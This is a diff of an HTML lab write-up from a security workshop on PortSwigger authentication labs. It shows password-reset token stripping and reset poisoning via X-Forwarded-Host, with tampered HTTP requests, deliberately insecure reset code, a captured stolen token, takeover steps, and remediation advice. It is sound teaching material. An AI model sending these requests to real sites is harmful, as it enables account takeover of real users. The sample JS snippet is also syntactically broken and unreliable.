+                </p>
+                <pre><code>POST /forgot-password?temp-forgot-password-token=q1w2e3r4t5y6 HTTP/1.1
 Host: &lt;target-lab-id&gt;.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-temp-forgot-password-token=xxxxxxxxxxxxxxxxxxxx&amp;username=wiener&amp;new-password-1=newpassword123&amp;new-password-2=newpassword123</code></pre>
+temp-forgot-password-token=q1w2e3r4t5y6&amp;username=wiener&amp;new-password-1=password123&amp;new-password-2=password123</code></pre>
+
+                <p>
+                  Look at the dangerous logic flaw in how the backend processes this submission:
+                </p>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Flawed Backend Password Reset Logic</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">// VULNERABLE CHECK</span><br>
+                    const targetUser = await db.getUser(req.body.username);<br><br>
+                    // If token parameter is missing or empty, this check evaluates to TRUE or is bypassed!<br>
+                    if (req.body.temp-forgot-password-token) {<br>
+                    &nbsp;&nbsp;if (req.body.temp-forgot-password-token !== targetUser.resetToken) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;return res.send("Invalid token");<br>
+                    &nbsp;&nbsp;}<br>
+                    }<br>
+                    // Because Carlos never requested a reset, Carlos.resetToken is null / unassigned!<br>
+                    // If the attacker provides an empty token or removes it, the condition passes!<br>
+                    targetUser.password = hash(req.body.new-password-1);<br>
+                    await targetUser.save();
+                  </div>
+                </div>
+
+                <h3>Step-by-Step Exploitation via Token Stripping</h3>
+                <ol>
+                  <li>
+                    <strong>Request Password Reset on Controlled Account:</strong> Go to the login page, click <em>Forgot password?</em>, and submit <code>wiener</code>.
                   </li>
                   <li>
-                    <strong>Parameter Tampering &amp; Token Stripping:</strong> Send the request to Burp Repeater. Delete the token value from both the query parameter and the POST body:
-                    <pre><code>POST /forgot-password?temp-forgot-password-token= HTTP/1.1
-...
-temp-forgot-password-token=&amp;username=carlos&amp;new-password-1=hacked123&amp;new-password-2=hacked123</code></pre>
+                    <strong>Open Email Client:</strong> Click the password reset link delivered to Wiener's inbox. The reset form loads in your browser.
                   </li>
                   <li>
-                    <strong>Execute Account Takeover:</strong> Click <strong>Send</strong>. The backend simply verifies whether the submitted token (empty string) equals the database token for Carlos (null / uninitialized), or ignores the token check altogether, resetting Carlos's password to <code>hacked123</code>.
+                    <strong>Intercept Form Submission:</strong> Type a new password (e.g. <code>password123</code>). In Burp Suite, turn <strong>Intercept on</strong>, and click <strong>Submit</strong>.
                   </li>
-                  <li>Log in as <code>carlos:hacked123</code> to achieve full account takeover.</li>
+                  <li>
+                    <strong>Send to Repeater &amp; Tamper Parameters:</strong> Send the captured <code>POST /forgot-password</code> request to Burp Repeater (<code>Ctrl + R</code>).
+                  </li>
+                  <li>
+                    <strong>Strip the Token &amp; Switch Username:</strong> In Burp Repeater:
+                    <ul>
+                      <li>Delete the token value from the query string: <code>?temp-forgot-password-token=</code> (or remove the parameter completely).</li>
+                      <li>In the body, delete the <code>temp-forgot-password-token</code> parameter entirely.</li>
+                      <li>Change <code>username=wiener</code> to <code>username=carlos</code>.</li>
+                      <li>Set <code>new-password-1=hacked123&amp;new-password-2=hacked123</code>.</li>
+                    </ul>
+                    <div class="terminal-window">
+                      <div class="terminal-header">
+                        <span class="terminal-circle tc-red"></span>
+                        <span class="terminal-circle tc-yellow"></span>
+                        <span class="terminal-circle tc-green"></span>
+                        <span class="terminal-title">Burp Repeater: Tampered Request</span>
+                      </div>
+                      <div class="terminal-body">
+                        POST /forgot-password?temp-forgot-password-token= HTTP/1.1<br>
+                        Host: &lt;target-lab-id&gt;.web-security-academy.net<br>
+                        Content-Type: application/x-www-form-urlencoded<br>
+                        Content-Length: 53<br><br>
+                        username=carlos&amp;new-password-1=hacked123&amp;new-password-2=hacked123
+                      </div>
+                    </div>
+                  </li>
+                  <li>
+                    <strong>Execute Attack:</strong> Click <strong>Send</strong>. The server responds with an HTTP <code>302 Found</code> redirecting to <code>/login</code>! Carlos's password has been successfully overwritten!
+                  </li>
+                  <li>
+                    <strong>Log In as Carlos:</strong> In the browser, log in with <code>carlos</code> : <code>hacked123</code> to achieve complete account takeover.
+                  </li>
                 </ol>
 
                 <!-- Section 8 -->
                 <h2 id="host-header-middleware-mechanics">8. Host Header Injection &amp; Reverse Proxy Middleware</h2>
                 <p>
-                  Web applications running behind reverse proxies, load balancers, and CDNs often construct absolute URLs dynamically based on incoming HTTP request headers:
+                  Modern web architectures place applications behind reverse proxies, CDNs, and load balancers (Cloudflare, AWS CloudFront, Nginx). When a client connects to the proxy, the proxy forwards the request to internal application servers.
                 </p>
-                <pre><code>$resetUrl = "https://" . $_SERVER['HTTP_HOST'] . "/forgot-password?token=" . $token;
-mail($userEmail, "Reset Your Password", $resetUrl);</code></pre>
+                <p>
+                  To keep track of what original domain the client visited, reverse proxies insert headers such as:
+                </p>
+                <ul>
+                  <li><code>Host: victim-bank.com</code></li>
+                  <li><code>X-Forwarded-Host: victim-bank.com</code></li>
+                  <li><code>X-Forwarded-Proto: https</code></li>
+                </ul>
 
                 <p>
-                  When intermediate reverse proxies handle requests, they often forward the client's original host header via <code>X-Forwarded-Host</code>. If the application trusts this header without validation, an attacker can poison the domain component of password reset links:
+                  The critical flaw occurs when developers construct absolute URLs using user-controlled HTTP headers:
                 </p>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Dangerous Dynamic URL Construction (PHP / Django / Express)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">// INSECURE: Trusting client-supplied middleware headers</span><br>
+                    $host = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : $_SERVER['HTTP_HOST'];<br>
+                    $resetLink = "https://" . $host . "/forgot-password?token=" . $secureToken;<br><br>
+                    // Email sent to victim:<br>
+                    mail($victimEmail, "Reset Your Password", "Click here: " . $resetLink);
+                  </div>
+                </div>
 
                 <!-- Section 9: Lab 5 -->
                 <h2 id="lab5-password-reset-poisoning">9. Lab 5: Password Reset Poisoning via Middleware</h2>
@@ -762,21 +1039,31 @@ mail($userEmail, "Reset Your Password", $resetUrl);</code></pre>
                   </div>
                   <h4 class="fw-bold text-primary mb-2">Lab: Password reset poisoning via middleware</h4>
                   <p class="small text-muted mb-0">
-                    <strong>Vulnerability:</strong> Intermediate reverse proxy middleware respects the <code>X-Forwarded-Host</code> header, allowing attackers to overwrite the domain in password reset emails sent to victims.
+                    <strong>Vulnerability Category:</strong> Password Reset Poisoning / Host Header Injection (CWE-640 &amp; CWE-20).
                   </p>
                 </div>
 
-                <h3>Attack Methodology: Weaponizing the Host Header</h3>
+                <h3>The Attack Mechanics: Hijacking the Reset Link Domain</h3>
+                <p>
+                  If an attacker triggers a password reset for <code>carlos</code> while injecting their own domain into <code>X-Forwarded-Host</code>, the backend generates a 100% legitimate cryptographic reset token for Carlos, but embeds it into a URL pointing to the attacker's server!
+                </p>
+                <p>
+                  When Carlos opens his email and clicks the reset link, his browser sends the secret reset token directly into the attacker's web server access logs!
+                </p>
+
+                <h3>Full Step-by-Step Exploitation</h3>
                 <ol>
                   <li>
-                    <strong>Capture Password Reset Request:</strong> On the login page, click <em>Forgot your password?</em>. Intercept the <code>POST /forgot-password</code> request in Burp Suite and send it to Burp Repeater.
+                    <strong>Obtain Attacker Exploit Server URL:</strong> In the PortSwigger lab banner, click <strong>Go to exploit server</strong>. Note your unique domain (e.g. <code>exploit-0a2b00c3...exploit-server.net</code>).
                   </li>
                   <li>
-                    <strong>Configure Attacker Exploit Server:</strong> Open the provided Exploit Server tab and record your unique host identifier:
-                    <pre><code>YOUR-EXPLOIT-SERVER-ID.exploit-server.net</code></pre>
+                    <strong>Capture the Password Reset Request:</strong> On the lab website, click <em>Forgot your password?</em>, enter <code>carlos</code>, and submit the form while intercepting in Burp Suite.
                   </li>
                   <li>
-                    <strong>Inject X-Forwarded-Host Header:</strong> In Burp Repeater, add the <code>X-Forwarded-Host</code> header pointing to your exploit server, and set the target username to <code>carlos</code>:
+                    <strong>Send to Burp Repeater:</strong> Find the <code>POST /forgot-password</code> request in Burp Proxy history and send it to Repeater.
+                  </li>
+                  <li>
+                    <strong>Inject X-Forwarded-Host Header:</strong> In Burp Repeater, inject the <code>X-Forwarded-Host</code> header pointing to your exploit server:
                     <div class="terminal-window">
                       <div class="terminal-header">
                         <span class="terminal-circle tc-red"></span>
@@ -786,47 +1073,73 @@ mail($userEmail, "Reset Your Password", $resetUrl);</code></pre>
                       </div>
                       <div class="terminal-body">
                         POST /forgot-password HTTP/1.1<br>
-                        Host: &lt;lab-target-id&gt;.web-security-academy.net<br>
-                        <span style="color: #ff5f56; font-weight: bold;">X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span><br>
+                        Host: 0af200d704543d3b80b2a75800dc00cb.web-security-academy.net<br>
+                        <span style="color: #ff5f56; font-weight: bold;">X-Forwarded-Host: exploit-0a2b00c304243d54807ea62f01700067.exploit-server.net</span><br>
                         Content-Type: application/x-www-form-urlencoded<br>
-                        Content-Length: 26<br><br>
-                        csrf=xxxxxx&amp;username=carlos
+                        Content-Length: 53<br><br>
+                        csrf=G7b4vI3zR0hZ2...&amp;username=carlos
                       </div>
                     </div>
                   </li>
                   <li>
-                    <strong>Victim Interaction:</strong> The backend generates a valid cryptographic token for Carlos, builds the reset link using the poisoned host header:
-                    <pre><code>https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=STOLEN_TOKEN_HERE</code></pre>
-                    and sends this link to Carlos's email address. The simulated victim clicks the link in their email.
+                    <strong>Dispatch Poisoned Request:</strong> Click <strong>Send</strong>. The server responds with HTTP <code>200 OK</code>: <em>"Please check your email for a password reset link."</em>
                   </li>
                   <li>
-                    <strong>Harvesting Token from Access Logs:</strong> Navigate to your Exploit Server &gt; open the <strong>Access log</strong>. Observe an incoming HTTP GET request from Carlos's browser:
-                    <pre><code>10.0.x.x - - "GET /forgot-password?temp-forgot-password-token=mF4e3pQ7wK9xL2... HTTP/1.1" 404</code></pre>
+                    <strong>Victim Interaction &amp; Token Harvest:</strong> The simulated victim (Carlos) opens his email and clicks the link. Go to your Exploit Server tab and click <strong>Access log</strong>. Look at the bottom entries:
+                    <div class="terminal-window">
+                      <div class="terminal-header">
+                        <span class="terminal-circle tc-red"></span>
+                        <span class="terminal-circle tc-yellow"></span>
+                        <span class="terminal-circle tc-green"></span>
+                        <span class="terminal-title">Attacker Exploit Server: Captured Access Log Entry</span>
+                      </div>
+                      <div class="terminal-body">
+                        10.0.4.128 - - [16/Sep/2026:06:22:45 +0000] "GET /forgot-password?<span style="color: #27c93f; font-weight: bold;">temp-forgot-password-token=M8aK1pL0vX4eQ9wZ2nR7</span> HTTP/1.1" 404 "User-Agent: Mozilla/5.0..."
+                      </div>
+                    </div>
+                    Carlos's secret token (<code>M8aK1pL0vX4eQ9wZ2nR7</code>) was delivered right into our hands!
                   </li>
                   <li>
-                    <strong>Account Takeover:</strong> Copy the stolen token. In your browser, navigate to the legitimate password reset endpoint on the target lab domain, replacing the token with Carlos's stolen token:
-                    <pre><code>https://&lt;lab-target-id&gt;.web-security-academy.net/forgot-password?temp-forgot-password-token=mF4e3pQ7wK9xL2...</code></pre>
-                    Submit a new password and immediately log in to Carlos's account, solving the lab.
+                    <strong>Execute Account Takeover:</strong> In your browser, navigate to the legitimate target lab domain, appending Carlos's stolen token:
+                    <pre><code>https://0af200d704543d3b80b2a75800dc00cb.web-security-academy.net/forgot-password?temp-forgot-password-token=M8aK1pL0vX4eQ9wZ2nR7</code></pre>
+                  </li>
+                  <li>
+                    <strong>Reset Password:</strong> Enter a new password (e.g. <code>password123</code>). Submit the form and log in as Carlos. The lab is completed!
                   </li>
                 </ol>
 
                 <!-- Section 10 -->
                 <h2 id="enterprise-defense">10. Defense-in-Depth &amp; Remediation Architecture</h2>
                 <p>
-                  Securing authentication requires defensive controls at every layer of the application lifecycle:
+                  To protect modern enterprise systems against the complete spectrum of authentication flaws discovered on Day 8, engineering teams must implement defense-in-depth across the code, architecture, and network layers:
                 </p>
 
-                <div class="card mb-3 border-success">
+                <div class="card mb-3 border-success shadow-sm">
                   <div class="card-header bg-success text-white fw-bold">
-                    <i class="bi bi-shield-check"></i> Defensive Hardening Checklist
+                    <i class="bi bi-shield-check"></i> Enterprise Remediation Blueprint for Developers
                   </div>
                   <div class="card-body">
-                    <ul class="mb-0 small" style="line-height: 1.8;">
-                      <li><strong>Uniform Error Messages:</strong> Never indicate whether a username or password was incorrect. Always return: <em>"Invalid username or password"</em> with identical byte lengths and response times.</li>
-                      <li><strong>Strict Parameter Type Validation:</strong> Reject unexpected parameter types (e.g., rejecting arrays when strings are expected) to neutralize batch array bypass attacks.</li>
-                      <li><strong>Cryptographic 2FA Binding:</strong> Store the 2FA state server-side in the session cache (e.g., Redis) and block access to all authenticated routes until the 2FA state transition is marked complete.</li>
-                      <li><strong>Never Trust Host Headers for URLs:</strong> Hardcode domain names in server configuration files (e.g., <code>APP_URL=https://company.com</code>) rather than constructing reset links dynamically from <code>Host</code> or <code>X-Forwarded-Host</code> headers.</li>
-                      <li><strong>Single-Use, Time-Bound Tokens:</strong> Ensure password reset tokens are tied cryptographically to a user ID, expire within 15 minutes, and invalidate immediately upon use.</li>
+                    <ul class="mb-0 small" style="line-height: 1.9;">
+                      <li>
+                        <strong>1. Eliminate Observable Response Discrepancies:</strong> Always return uniform error messages (<em>"Invalid username or password"</em>). Ensure the response byte length, HTTP status code (<code>401 Unauthorized</code>), and execution timing (via constant-time comparison) are strictly identical regardless of whether the user exists.
+                      </li>
+                      <li>
+                        <strong>2. Enforce Strict Parameter Types &amp; Schema Validation:</strong> Never trust request data types. Use validation libraries (Zod, Pydantic, Joi) to strictly reject arrays or objects on password fields:
+                        <pre style="margin: 6px 0; font-size: 11px;"><code>if (typeof req.body.password !== 'string') return res.status(400).send("Invalid input");</code></pre>
+                      </li>
+                      <li>
+                        <strong>3. Count Credentials, Not HTTP Packets:</strong> In API gateways and rate-limiters, charge rate-limiting quotas based on the number of credentials processed rather than raw HTTP requests.
+                      </li>
+                      <li>
+                        <strong>4. Enforce Multi-Stage State Verification for 2FA:</strong> Never issue an active session cookie upon Stage 1 (password) verification. Issue a temporary, non-privileged token that can only be redeemed at the 2FA endpoint. Verify 2FA status at every protected endpoint.
+                      </li>
+                      <li>
+                        <strong>5. Never Construct URLs from Dynamic Request Headers:</strong> Never trust <code>Host</code>, <code>X-Forwarded-Host</code>, or <code>Client-IP</code> headers for sensitive application logic. Always store the canonical base URL in secure environment variables:
+                        <pre style="margin: 6px 0; font-size: 11px;"><code>const resetLink = `${process.env.APP_BASE_URL}/forgot-password?token=${secureToken}`;</code></pre>
+                      </li>
+                      <li>
+                        <strong>6. Cryptographically Bind Reset Tokens to Users:</strong> Password reset tokens must be tied to a specific user ID in the database, single-use, and expire within a short window (e.g. 15 minutes). The reset form must never rely on a client-submitted username field.
+                      </li>
                     </ul>
                   </div>
                 </div>
@@ -834,12 +1147,12 @@ mail($userEmail, "Reset Your Password", $resetUrl);</code></pre>
                 <!-- Section 11 -->
                 <h2 id="day8-takeaways">11. Day 8 Summary &amp; Key Takeaways</h2>
                 <div class="callout-box security-notice">
-                  <h4 class="text-primary"><i class="bi bi-check2-all"></i> Core Insights from Day 8</h4>
+                  <h4 class="text-primary"><i class="bi bi-check2-all"></i> Summary of Day 8 Practical Findings</h4>
                   <ul class="mb-0" style="line-height: 1.8;">
-                    <li><strong>Error Differences Fuel Enumeration:</strong> Subtly distinct error messages or response lengths transform a complex password brute-force into a trivial two-step reconnaissance task.</li>
-                    <li><strong>Rate Limits Can Be Circumvented via Protocol Features:</strong> Array structures in JSON bodies allow testing hundreds of passwords within a single HTTP request packet, completely bypassing IP rate limits.</li>
-                    <li><strong>2FA is Only as Strong as Its State Machine:</strong> If protected endpoints (like <code>/my-account</code>) fail to verify that the 2FA stage was completed, forced browsing neutralizes 2FA entirely.</li>
-                    <li><strong>Host Header Poisoning is Lethal:</strong> Dynamically building password reset links from reverse proxy headers allows unauthenticated attackers to steal reset tokens out-of-band.</li>
+                    <li><strong>Enumeration Feeds Brute-Force:</strong> Subtle differences in error messages (<code>Invalid username</code> vs <code>Incorrect password</code>) allow attackers to isolate valid accounts and focus computational power with sniper accuracy.</li>
+                    <li><strong>Array Types Circumvent Rate Limits:</strong> Submitting 100 passwords in a JSON array within a single HTTP request packet exploits WAFs that only count request packets.</li>
+                    <li><strong>2FA Requires Server-Side State Gates:</strong> If sensitive endpoints fail to verify 2FA completion, forced browsing directly to <code>/my-account</code> bypasses the second factor entirely.</li>
+                    <li><strong>Middleware Trust Boundaries Enable Account Takeovers:</strong> Forwarding headers like <code>X-Forwarded-Host</code> without validation allows unauthenticated attackers to steal password reset tokens out-of-band.</li>
                   </ul>
                 </div>
 
@@ -851,10 +1164,10 @@ mail($userEmail, "Reset Your Password", $resetUrl);</code></pre>
                   </div>
                   <div>
                     <h5 class="fw-bold text-danger mb-1" style="font-size: 16px;">
-                      WARNING: Strictly For Educational &amp; Defensive Purposes Only
+                      DEFENSIVE LEARNING NOTICE: Strictly For Educational &amp; Security Engineering Purposes
                     </h5>
                     <p class="mb-0 text-dark small" style="line-height: 1.6;">
-                      All authentication attacks, brute-force bypasses, and Host header poisoning techniques documented in this report were executed strictly inside authorized PortSwigger Web Security Academy lab environments. Attempting unauthorized access, password resets, or brute-force attacks against third-party web services without explicit written permission is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber law. TheWH2 and BugXploit promote ethical, responsible offensive security research.
+                      All penetration testing methodologies, raw HTTP payloads, and Burp Suite walk-throughs documented in this report were performed strictly within authorized PortSwigger Web Security Academy laboratory environments during the BugXploit workshop. We do not promote, condone, or encourage any illegal activity. This report is published so developers and security practitioners can understand how authentication vulnerabilities are exploited and engineer resilient defenses against unauthorized account takeovers. Attempting these attacks against systems without prior written authorization is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber laws.
                     </p>
                   </div>
                 </div>
